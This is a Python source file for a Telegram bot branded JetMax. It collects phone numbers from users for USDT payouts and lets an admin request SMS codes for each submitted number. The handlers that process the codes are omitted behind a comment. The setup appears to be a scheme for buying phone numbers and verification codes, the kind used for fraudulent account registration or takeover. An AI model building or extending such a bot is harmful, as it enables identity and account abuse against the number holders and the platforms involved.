import asyncio
import asyncpg
import os
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_URL = os.getenv("CHANNEL_URL")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

db_pool = None

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                current_number TEXT,
                number_timestamp BIGINT,
                balance DECIMAL(10,2) DEFAULT 0.00,
                waiting_for_number BOOLEAN DEFAULT FALSE
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                status TEXT,
                created_at BIGINT
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS approved_requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                request_number INTEGER,
                created_at BIGINT
            )
        ''')

def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="💰 Баланс")]],
        resize_keyboard=True
    )
    return keyboard

def get_chat_id():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        username = url.replace("https://t.me/", "")
        return f"@{username}"
    elif url.startswith("@"):
        return url
    else:
        return int(url)

def get_channel_link():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        return url
    elif url.startswith("@"):
        return f"https://t.me/{url[1:]}"
    else:
        return f"https://t.me/c/{str(url).replace('-100', '')}"

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    async with db_pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO users (user_id, username) VALUES ($1, $2)
            ON CONFLICT (user_id) DO UPDATE SET username = $2
        ''', user_id, username)
    
    channel_link = get_channel_link()
    await message.answer(
        f"<b>🔐 JetMax - твое богатое будущее!</b>\n<i>Для дальнейшей работы с ботом подпишитесь на канал:</i> {channel_link}",
        reply_markup=get_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "💰 Баланс")
async def show_balance(message: types.Message):
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", message.from_user.id)
        balance = row["balance"] if row else 0.00
    await message.answer(
        f"<b>💳 Ваш текущий баланс:</b>\n<code>{balance:.2f} USDT</code>",
        parse_mode="HTML"
    )

@dp.message(Command("menu"))
async def cmd_menu(message: types.Message):
    await message.answer("<b>Меню:</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("<b>⛔ Доступ запрещен</b>", parse_mode="HTML")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Создать заявку", callback_data="admin_create")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")]
    ])
    await message.answer(
        "<b>👨‍💼 Админ панель</b>\n<i>Выберите действие:</i>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "admin_create")
async def admin_create(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    chat_id = get_chat_id()
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сдать номер", callback_data="send_number")]
    ])
    
    try:
        await bot.send_message(
            chat_id,
            "<b>💼 Требуется номер для работы!</b>\n<i>⏱️ Нажмите кнопку снизу для сдачи</i>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        await callback.answer("✅ Заявка создана")
    except Exception as e:
        await callback.answer(f"❌ Ошибка")
        await callback.message.answer(f"<b>❌ Ошибка отправки в канал:</b>\n<code>{e}</code>", parse_mode="HTML")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    async with db_pool.acquire() as conn:
        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
        approved_count = await conn.fetchval("SELECT COUNT(*) FROM approved_requests")
        active_requests = await conn.fetchval("SELECT COUNT(*) FROM requests")
        total_payout = await conn.fetchval("SELECT SUM(balance) FROM users")
        
    await callback.message.answer(
        f"<b>📊 Статистика</b>\n\n"
        f"<i>👥 Пользователей:</i> <code>{users_count}</code>\n"
        f"<i>✅ Выполнено заявок:</i> <code>{approved_count}</code>\n"
        f"<i>🔄 Активных заявок:</i> <code>{active_requests}</code>\n"
        f"<i>💰 Выплачено:</i> <code>{total_payout or 0:.2f} USDT</code>",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "send_number")
async def call_send_number(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    
    await callback.answer()
    await callback.message.answer("🔄 Перенаправление в личные сообщения...")
    
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT current_number, number_timestamp, waiting_for_number FROM users WHERE user_id = $1", user_id)
        
        if user and user["waiting_for_number"]:
            await bot.send_message(user_id, "<b>⏳ У вас уже есть активная заявка! Отправьте номер</b>", parse_mode="HTML")
            return
        
        if user and user["current_number"] and user["number_timestamp"]:
            elapsed = int(time.time()) - user["number_timestamp"]
            if elapsed < 600:
                remaining = 600 - elapsed
                minutes = remaining // 60
                seconds = remaining % 60
                await bot.send_message(
                    user_id,
                    f"<b>⏳ Подождите {minutes:02d}:{seconds:02d} перед новой отправкой</b>",
                    parse_mode="HTML"
                )
                return
        
        # Устанавливаем флаг ожидания номера
        await conn.execute("UPDATE users SET waiting_for_number = TRUE WHERE user_id = $1", user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отменить", callback_data="cancel_request")]
    ])
    
    await bot.send_message(
        user_id,
        "<b>⏱️ Отправьте номер</b>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    
    # Таймаут 60 секунд
    asyncio.create_task(timeout_waiting(user_id))

async def timeout_waiting(user_id: int):
    await asyncio.sleep(60)
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT waiting_for_number FROM users WHERE user_id = $1", user_id)
        if row and row["waiting_for_number"]:
            await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
            await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")

@dp.callback_query(F.data == "cancel_request")
async def cancel_request(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    
    async with db_pool.acquire() as conn:
        await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    
    await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
    await bot.send_message(
        ADMIN_ID,
        f"<b>🔐 Заявка отменена!</b>\n<i>Пользователь:</i> @{username} [<code>{user_id}</code>]",
        parse_mode="HTML"
    )
    await callback.answer()

# ГЛАВНЫЙ ХЭНДЛЕР - обрабатывает все сообщения
@dp.message()
async def handle_all_messages(message: types.Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    # Пропускаем команды
    if text.startswith('/'):
        return
    
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT waiting_for_number, username FROM users WHERE user_id = $1", user_id)
        
        if row and row["waiting_for_number"]:
            # Пользователь ждет - это номер
            await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
            
            number = text
            username = row["username"] or message.from_user.username or message.from_user.full_name
            
            # Сохраняем номер
            await conn.execute('''
                UPDATE users SET current_number = $1, number_timestamp = $2 WHERE user_id = $3
            ''', number, int(time.time()), user_id)
            
            await conn.execute('''
                INSERT INTO requests (user_id, username, number, status, created_at) 
                VALUES ($1, $2, $3, 'waiting_sms', $4)
            ''', user_id, username, number, int(time.time()))
            
            # Отправляем админу
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Запросить смс", callback_data=f"request_sms_{user_id}"),
                 InlineKeyboardButton(text="Отклонить", callback_data=f"reject_{user_id}")]
            ])
            
            await bot.send_message(
                ADMIN_ID,
                f"<b>💼 Новая заявка от @{username} (ID: {user_id})</b>\n<i>Номер:</i> <code>{number}</code>",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
            
            await message.answer("<b>✅ Номер принят</b>\n<i>Ожидайте решения администратора</i>", parse_mode="HTML")

# Остальные хэндлеры (request_sms, reject_request, process_sms, accept, registered, error, cancel_sms) остаются без изменений
# ...

async def main():
    await init_db()
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
